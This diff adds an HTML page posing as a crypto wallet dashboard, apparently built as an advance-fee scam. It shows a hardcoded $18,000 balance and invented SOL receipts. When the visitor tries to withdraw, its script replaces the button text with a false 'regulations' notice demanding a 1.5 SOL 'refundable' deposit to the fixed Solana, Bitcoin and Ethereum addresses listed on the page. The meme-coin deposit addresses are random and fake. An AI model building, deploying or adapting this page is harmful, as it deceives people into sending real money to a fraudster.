@@ -1,0 +1,389 @@
+<!doctype html>
+<html lang="en"> 
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>Crypto Dashboard</title> 
+  <style>
+        body {
+            background-color: #000;
+            color: #77bff2;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .header {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            width: 90%;
+            max-width: 350px;
+            margin-bottom: 10px;
+        }
+        h1, h2 {
+            font-size: 26px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        .dashboard {
+            width: 90%;
+            max-width: 350px;
+            padding: 15px;
+            border-radius: 12px;
+            background: rgba(119, 191, 242, 0.1);
+            box-shadow: 0 0 8px #77bff2;
+            margin-bottom: 20px;
+        }
+        .balance {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .balance img {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+        }
+        .buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        .btn {
+            background: #77bff2;
+            color: #000;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 10px;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+        .btn:hover {
+            background: #5aa8e0;
+        }
+        .lang-btn {
+            background: linear-gradient(135deg, #77bff2, #5aa8e0);
+            color: #000; /* Changed text color to black */
+            border: none;
+            padding: 4px 8px;
+            font-size: 11px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-right: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            transition: transform 0.1s, background 0.3s;
+        }
+        .lang-btn:hover {
+            background: linear-gradient(135deg, #5aa8e0, #77bff2);
+            transform: scale(1.05);
+        }
+        .lang-btn:active {
+            transform: scale(0.95);
+        }
+        .popup {
+            position: fixed;
+            width: 90%;
+            max-width: 300px;
+            background: #000;
+            color: #77bff2;
+            padding: 15px;
+            border-radius: 12px;
+            box-shadow: 0 0 8px #77bff2;
+            display: none;
+            text-align: center;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        #langPopup {
+            max-width: 150px;
+            padding: 5px;
+        }
+        #langPopup .lang-btn {
+            width: 100%;
+            margin: 5px 0;
+        }
+        .popup h3 {
+            margin-bottom: 10px;
+            font-size: 20px;
+        }
+        .popup p {
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        .popup .row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 5px;
+            background: rgba(119, 191, 242, 0.1);
+            border-radius: 8px;
+            margin: 5px 0;
+        }
+        .popup img {
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+        }
+        .network {
+            font-size: 12px;
+            color: #77bff2;
+            opacity: 0.8;
+            margin-left: 5px;
+        }
+        .copy-btn {
+            width: 25px;
+            height: 25px;
+            cursor: pointer;
+        }
+        .input-box {
+            width: 90%;
+            background: #000;
+            border: 2px solid #77bff2;
+            padding: 10px;
+            font-size: 14px;
+            text-align: center;
+            border-radius: 8px;
+            color: #77bff2;
+            margin-bottom: 12px;
+        }
+        .close {
+            cursor: pointer;
+            display: block;
+            margin-top: 10px;
+            color: #77bff2;
+        }
+        .coin-container {
+            width: 90%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .coin {
+            background: rgba(119, 191, 242, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+        }
+        .coin span {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .coin .balance {
+            color: #77bff2;
+            font-size: 18px;
+            margin-bottom: 0;
+        }
+        #withdrawBtn {
+            white-space: normal;
+            height: auto;
+            min-height: 40px;
+        }
+        .address-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+        #memePopup {
+            max-width: 250px;
+            padding: 5px;
+        }
+        #memePopup h3 {
+            font-size: 16px;
+            margin-bottom: 5px;
+        }
+        #memePopup p {
+            font-size: 10px;
+            margin-bottom: 5px;
+        }
+        #memePopup .close {
+            margin-top: 5px;
+            font-size: 12px;
+        }
+        #memePopup .copy-btn {
+            width: 20px;
+            height: 20px;
+        }
+    </style> 
+ </head> 
+ <body> 
+  <div class="header">
+    <button class="lang-btn" id="langBtn" data-en="Language" data-es="Idioma">Language</button>
+  </div>
+  <h1 data-en="Wallet" data-es="Cartera">Wallet</h1> 
+  <div class="dashboard"> 
+   <div class="balance"> 
+    <img src="https://i.postimg.cc/fyzSXybx/Screenshot-20250224-160447.png"> <span>18,000</span> 
+   </div> 
+   <div class="buttons"> 
+    <button class="btn" onclick="showPopup('depositPopup')" data-en="Deposit" data-es="Depositar">Deposit</button> 
+    <button class="btn" onclick="showPopup('withdrawPopup')" data-en="Withdraw" data-es="Retirar">Withdraw</button> 
+    <button class="btn" onclick="showPopup('balancePopup')" data-en="Balance" data-es="Saldo">Balance</button> 
+    <button class="btn" onclick="showPopup('historyPopup')" data-en="History" data-es="Historial">History</button> 
+   </div> 
+  </div> 
+  <h2 data-en="Meme Coins" data-es="Monedas Meme">Meme Coins</h2> 
+  <div class="coin-container" id="coins"></div> 
+
+  <!-- Deposit Popup --> 
+  <div id="depositPopup" class="popup"> 
+   <h3 data-en="Deposit" data-es="Depositar">Deposit</h3> 
+   <div class="row"> 
+    <img src="https://i.postimg.cc/28YjwRs3/Screenshot-20250223-233453.png"> <span class="network">Solana</span> <span>84UZLk...ptp8</span> 
+    <img src="https://i.postimg.cc/8cd6Dw1T/Screenshot-20250223-235457.png" class="copy-btn" onclick="copyToClipboard('84UZLkLFX7e3XCe9PmEDE7kNaaaZK6zDHGPuPEa6ptp8')"> 
+   </div> 
+   <div class="row"> 
+    <img src="https://i.postimg.cc/qvLTQN85/Screenshot-20250223-233428.png"> <span class="network">Bitcoin</span> <span>bc1qrde...plhd</span> 
+    <img src="https://i.postimg.cc/8cd6Dw1T/Screenshot-20250223-235457.png" class="copy-btn" onclick="copyToClipboard('bc1qrde6hgzsstkqlph5sx2xa4nvnr9csgmd59plhd')"> 
+   </div> 
+   <div class="row"> 
+    <img src="https://i.postimg.cc/W44sQfX1/Screenshot-20250224-104503.png"> <span class="network">Ethereum</span> <span>0x2eb6a...F034A</span> 
+    <img src="https://i.postimg.cc/8cd6Dw1T/Screenshot-20250223-235457.png" class="copy-btn" onclick="copyToClipboard('0x2eb6a280EAfA46Ce23Ed5645b47D18E977cF034A')"> 
+   </div> 
+   <span class="close" onclick="hidePopup('depositPopup')" data-en="Close" data-es="Cerrar">Close</span> 
+  </div> 
+
+  <!-- Withdraw Popup --> 
+  <div id="withdrawPopup" class="popup"> 
+   <h3 data-en="Withdraw" data-es="Retirar">Withdraw</h3> 
+   <p data-en="You are withdrawing $18,000 in Solana." data-es="Estás retirando $18,000 en Solana.">You are withdrawing $18,000 in Solana.</p> 
+   <img src="https://i.postimg.cc/28YjwRs3/Screenshot-20250223-233453.png"> 
+   <input type="text" placeholder="Enter SOL Address" class="input-box" id="withdrawAddress" data-en-placeholder="Enter SOL Address" data-es-placeholder="Ingresa la dirección SOL"> 
+   <button class="btn" id="withdrawBtn" onclick="showTaxMessage()" data-en="Withdraw" data-es="Retirar">Withdraw</button> 
+   <span class="close" onclick="hidePopup('withdrawPopup')" data-en="Close" data-es="Cerrar">Close</span> 
+  </div> 
+
+  <!-- Balance Popup --> 
+  <div id="balancePopup" class="popup"> 
+   <h3 data-en="Balance" data-es="Saldo">Balance</h3> 
+   <p>$18,000</p> 
+   <span class="close" onclick="hidePopup('balancePopup')" data-en="Close" data-es="Cerrar">Close</span> 
+  </div> 
+
+  <!-- History Popup --> 
+  <div id="historyPopup" class="popup"> 
+   <h3 data-en="Transaction History" data-es="Historial de Transacciones">Transaction History</h3> 
+   <p data-en="+50 SOL received" data-es="+50 SOL recibidos">+50 SOL received</p> 
+   <p data-en="+120 SOL received" data-es="+120 SOL recibidos">+120 SOL received</p> 
+   <p data-en="+75 SOL received" data-es="+75 SOL recibidos">+75 SOL received</p> 
+   <p data-en="+30 SOL received" data-es="+30 SOL recibidos">+30 SOL received</p> 
+   <p data-en="+25 SOL received" data-es="+25 SOL recibidos">+25 SOL received</p> 
+   <span class="close" onclick="hidePopup('historyPopup')" data-en="Close" data-es="Cerrar">Close</span> 
+  </div> 
+
+  <!-- Meme Coin Popup --> 
+  <div id="memePopup" class="popup"> 
+   <h3 id="popupTitle"></h3> 
+   <p data-en="Deposit Address:" data-es="Dirección de Depósito:">Deposit Address:</p> 
+   <div class="address-row">
+    <p class="address" id="popupAddress"></p>
+    <img src="https://i.postimg.cc/8cd6Dw1T/Screenshot-20250223-235457.png" class="copy-btn" id="memeCopyBtn">
+   </div>
+   <span class="close" onclick="hidePopup('memePopup')" data-en="Close" data-es="Cerrar">Close</span> 
+  </div> 
+
+  <!-- Language Popup -->
+  <div id="langPopup" class="popup">
+    <button class="lang-btn" onclick="changeLanguage('en')" data-en="English" data-es="Inglés">English</button>
+    <button class="lang-btn" onclick="changeLanguage('es')" data-en="Spanish" data-es="Español">Spanish</button>
+    <span class="close" onclick="hidePopup('langPopup')" data-en="Close" data-es="Cerrar">Close</span>
+  </div>
+
+  <script>
+        let currentLanguage = 'en';
+
+        const translations = {
+            en: {
+                withdrawMessage: "Due to regulations on crypto transfers, the amount of 1.5 SOL must be deposited (instantly refunded) to authorize this transaction. Copy the Solana address from this wallet to make the deposit. After that, you can then withdraw.",
+                copiedAlert: "Copied!"
+            },
+            es: {
+                withdrawMessage: "Debido a regulaciones en transferencias de criptomonedas, se debe depositar 1.5 SOL (reembolsado instantáneamente) para autorizar esta transacción. Copia la dirección de Solana de esta billetera para hacer el depósito. Después de eso, podrás retirar.",
+                copiedAlert: "¡Copiado!"
+            }
+        };
+
+        function showPopup(id) {
+            document.querySelectorAll('.popup').forEach(popup => popup.style.display = 'none');
+            document.getElementById(id).style.display = "block";
+        }
+
+        function hidePopup(id) {
+            document.getElementById(id).style.display = "none";
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => alert(translations[currentLanguage].copiedAlert));
+        }
+
+        function showTaxMessage() {
+            const withdrawBtn = document.getElementById("withdrawBtn");
+            withdrawBtn.innerText = translations[currentLanguage].withdrawMessage;
+            withdrawBtn.style.fontSize = "12px";
+            withdrawBtn.style.padding = "10px";
+            withdrawBtn.style.lineHeight = "1.2";
+        }
+
+        function changeLanguage(lang) {
+            currentLanguage = lang;
+            document.querySelectorAll('[data-en]').forEach(element => {
+                element.textContent = element.getAttribute(`data-${lang}`);
+            });
+            document.querySelectorAll('input[data-en-placeholder]').forEach(input => {
+                input.placeholder = input.getAttribute(`data-${lang}-placeholder`);
+            });
+            const withdrawBtn = document.getElementById("withdrawBtn");
+            if (withdrawBtn.innerText !== "Withdraw" && withdrawBtn.innerText !== "Retirar") {
+                withdrawBtn.innerText = translations[lang].withdrawMessage;
+            }
+            hidePopup('langPopup');
+        }
+
+        document.getElementById('langBtn').addEventListener('click', () => showPopup('langPopup'));
+
+        const memeCoins = [
+            "Dogecoin", "Shiba Inu", "PepeCoin", "Floki Inu", "SafeMoon",
+            "Kishu Inu", "Hoge Finance", "Akita Inu", "CateCoin",
+            "FantomCoin", "Tiger King Coin", "Baby Doge Coin", "Wojak", "DogeBonk",
+            "MonaCoin", "PoodleCoin", "BananaCoin", "Kabosu Inu", "Saitama Inu"
+        ];
+
+        const container = document.getElementById("coins");
+        const popupTitle = document.getElementById("popupTitle");
+        const popupAddress = document.getElementById("popupAddress");
+        const memeCopyBtn = document.getElementById("memeCopyBtn");
+
+        memeCoins.forEach((coin, index) => {
+            const div = document.createElement("div");
+            div.classList.add("coin");
+            div.innerHTML = `<span>${coin}</span> <span class="balance">$0.00</span>`;
+            div.onclick = () => showPopupMeme(coin, `0x${Math.random().toString(36).substr(2, 10)}`);
+            container.appendChild(div);
+        });
+
+        function showPopupMeme(coin, address) {
+            popupTitle.textContent = coin;
+            popupAddress.textContent = address;
+            memeCopyBtn.onclick = () => copyToClipboard(address);
+            showPopup('memePopup');
+        }
+    </script> 
+ </body>
+</html>
